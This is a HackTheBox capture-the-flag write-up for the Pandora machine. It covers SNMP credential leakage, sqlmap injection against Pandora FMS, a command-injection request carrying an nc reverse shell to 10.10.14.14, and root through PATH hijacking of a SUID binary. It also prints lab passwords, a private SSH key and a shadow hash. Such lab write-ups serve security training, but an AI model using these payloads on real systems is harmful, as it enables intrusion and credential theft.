# Pandora - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏pandora.JPG](images/Pandora.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```161``` (UDP).

***User 1***: By scanning for UDP ports we found port ```161``` which is ```SNMP``` service, By running ```snmp-check``` we found a running process which contains the credentials of ```daniel``` user.
 
***User 2***: By enumerating we found another web page called ```pandora_console```, We found that the file ```chart_generator.php``` vulnerable to SQLi, Using that we got the credentials of ```matt``` user to ```pandora_console```, Using CVE-2020-13851 we get a reverse shell as ```matt``` user.


***Root***: By enumerating we found binary ```/usr/bin/pandora_backup``` with SUID permission which runs ```tar``` command, By changing the ```PATH``` we create a custom ```tar``` command which let us shell as ```root``` user.

![pwn.JPG](images/pwn.JPG)


## Pandora Solution

### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ nmap -sV -sC -oA nmap/Pandora 10.10.11.136
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-10 23:17 IST
Nmap scan report for 10.10.11.136
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

By running UDP scan we get:
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ nmap -sU 10.10.11.136
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

```

We can see the service ```SNMP``  port which is ```161```.

```SNMP``` - Simple Network Management Protocol is a networking protocol used for the management and monitoring of network-connected devices in Internet Protocol networks. The SNMP protocol is embedded in multiple local devices such as routers, switches, servers, firewalls, and wireless access points accessible using their IP address. SNMP provides a common mechanism for network devices to relay management information within single and multi-vendor LAN or WAN environments ([Reference](https://www.thousandeyes.com/learning/techtorials/snmp-simple-network-management-protocol))

Let's use ```snmp-check``` to see what we get can:
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ snmp-check 10.10.11.136
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.136:161 using SNMPv1 and community 'public'

...
  835                   runnable              cron                  /usr/sbin/CRON        -f                  
  842                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
  863                   runnable              atd                   /usr/sbin/atd         -f                  
...
```

Let's try to use the credentials ```daniel:HotelBabylon23```  using SSH:
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ ssh daniel@10.10.11.136
The authenticity of host 'panda.htb (10.10.11.136)' can't be established.
ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'panda.htb,10.10.11.136' (ECDSA) to the list of known hosts.
daniel@panda.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 15 Jan 19:24:14 UTC 2022

  System load:  0.02              Processes:             227
  Usage of /:   62.8% of 4.87GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.136
  Swap usage:   0%

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$
```

And we are successfully login as ```daniel```.


### User 2


Let's analyze the binary ```/usr/bin/host_check``` using [Ghidra](https://ghidra-sre.org/):

![host_check.JPG](images/host_check.JPG)

We can see the following:
```c
iVar1 = system("/usr/bin/curl \'http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23\' > ~/.host_check 2>/dev/null");
```

Let's check this API on ```/var/www/html/pandora_console```.

If we are trying to access to [http://10.10.11.136/pandora_console](http://10.10.11.136/pandora_console) it's failed, We can access this API by creating SSH tunnel as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ ssh -N -L 8888:127.0.0.1:80 daniel@panda.htb
daniel@panda.htb's password: 
```

And by browsing to [http://localhost:8888/pandora_console](http://localhost:8888/pandora_console) we get:

![pandorapage.JPG](images/pandorapage.JPG)

By trying to guess the credentials of ```daniel:daniel``` we get:

![onlyapi.JPG](images/onlyapi.JPG)

We need to find a way to change it.

Following this [article](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained) we found that we can use SQLi on [http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=](http://127.0.0.1/pandora_console/include/chart_generator.php?session_id='') page.

Let's use [sqlmap](https://sqlmap.org/) on ```tsessions_php``` table (which contins the PHP sessions - according to the article before):
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ sqlmap -u http://127.0.0.1:8888/pandora_console/include/chart_generator.php?session_id='' -dump -T tsessions_php
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:45:52 /2022-01-22/

[00:45:52] [WARNING] provided value for parameter 'session_id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[00:45:52] [INFO] resuming back-end DBMS 'mysql' 
[00:45:52] [INFO] testing connection to the target URL
[00:45:53] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=58tfci2djt1...affobdlpko'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-7894' OR 5100=5100#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=' OR (SELECT 4537 FROM(SELECT COUNT(*),CONCAT(0x7170717671,(SELECT (ELT(4537=4537,1))),0x7162787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zTIf

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=' AND (SELECT 3163 FROM (SELECT(SLEEP(5)))bsnY)-- BVVc
---
[00:45:55] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[00:45:55] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[00:45:55] [INFO] fetching current database
[00:45:55] [INFO] resumed: 'pandora'
[00:45:55] [INFO] fetching columns for table 'tsessions_php' in database 'pandora'
....
Database: pandora
Table: tsessions_php
[47 entries]
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1r40mclpg0t5qfibd988coo3kh | id_usuario|s:6:"daniel";                            | 1642804941  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 58tfci2djt1fdpo1affobdlpko | NULL                                                | 1642805557  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| bd17h0ufr4djoj400nihbkr7pg | id_usuario|s:6:"daniel";                            | 1642805493  |
| c6vur21k3uue7dnfgu4dhdbfph | NULL                                                | 1642805874  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| e6iv8omdgvjbg55jl6qsgrvaf9 | id_usuario|s:6:"daniel";                            | 1642765247  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| guedmmpeefep68ojdinu0b5s9q | NULL                                                | 1642805956  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| mks68d82i4p8hdmth0u5lj0ihi | NULL                                                | 1642805894  |
| mlvklim8k0j16d6dn1nfufqi09 | NULL                                                | 1642804571  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
+----------------------------+-----------------------------------------------------+-------------+


```

And from the table dump we get the ```PHPSESSID``` password of ```matt``` user ```g4e01qdgk36mfdh90hvcc54umq```.

Let's use this session:

![session.JPG](images/session.JPG)

Following this [article](https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities) we can build the following HTTP request to get a reverse shell:
```http
POST /pandora_console/ajax.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://localhost:8888
DNT: 1
Connection: close
Referer: http://localhost:8888/pandora_console/index.php?login=1
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq
Upgrade-Insecure-Requests: 1

 page=include/ajax/events&perform_event_response=10000000&target=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.14+4242+>/tmp/f&response_id=1 
```

And we get a reverse shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from panda.htb [10.10.11.136] 51890
sh: 0: can't access tty; job control turned off
$ whoami
matt
$ pwd
/var/www/pandora/pandora_console
$ cd /home/matt
$ cat user.txt
d719cdc9515040a811403771f38c8966
```

And we get the user flag ```d719cdc9515040a811403771f38c8966```.

### Root

By running [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) we found the following file:
```console
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
...
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)
...
```

Before running it, Let's get a proper shell, We need to create an SSH key to ```matt``` using ```ssh-keygen```:
```console
matt@pandora:/tmp$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 

Created directory '/home/matt/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:AAhjxZU8UF8oItqg15rsRoDXrZxxVytk+vEs1Sn1luU matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|ooo+*o. ..       |
|oo.o *..+ . .   .|
|+o.o..+= . + o + |
|= + + +.+ + o + E|
| = + = oS* . .   |
|  = +   o o      |
| o       .       |
|  o              |
| .               |
+----[SHA256]-----+
matt@pandora:/tmp$ cat /home/matt/.ssh/id_rsa
cat /home/matt/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```	

And by using this SSH private key we get a proper shell of ```matt``` user (If it's failed - copy your public key to /home/.ssh/authorized_keys):
```console
┌─[evyatar@parrot]─[/hackthebox/Pandora]
└──╼ $ ssh -i id_rsa matt@pandora
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 22 Jan 00:53:54 UTC 2022

  System load:  0.0               Processes:             239
  Usage of /:   63.0% of 4.87GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.10.11.136
  Swap usage:   0%

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$
```
By observing the binary ```/usr/bin/pandora_backup``` using [Ghidra](https://ghidra-sre.org/) we can see the following ```main``` function:

![main.JPG](images/main.JPG)

As we can see, It's call to ```tar```, We can create our custom ```tar``` command on ```/tmp``` directory and append ```/tmp``` to ```PATH``` as follow:
```console
matt@pandora:/tmp$ cat tar
/bin/sh
matt@pandora:/tmp$ chmod 777 tar
matt@pandora:/tmp$ export PATH=/tmp:$PATH
```

Now, Let's run the binary:
```console
matt@pandora:/tmp$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# whoami
root
# cat /root/root.txt
ebef51b5fe76a7a4882c09f8c8303208

```

And we get the root flag ```ebef51b5fe76a7a4882c09f8c8303208```.


```console
# cat /etc/shadow | grep root | cut -d':' -f2 
$6$HM2preufywiCDqbY$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC/.Z0oe9D6dT0cR7suhfr.
```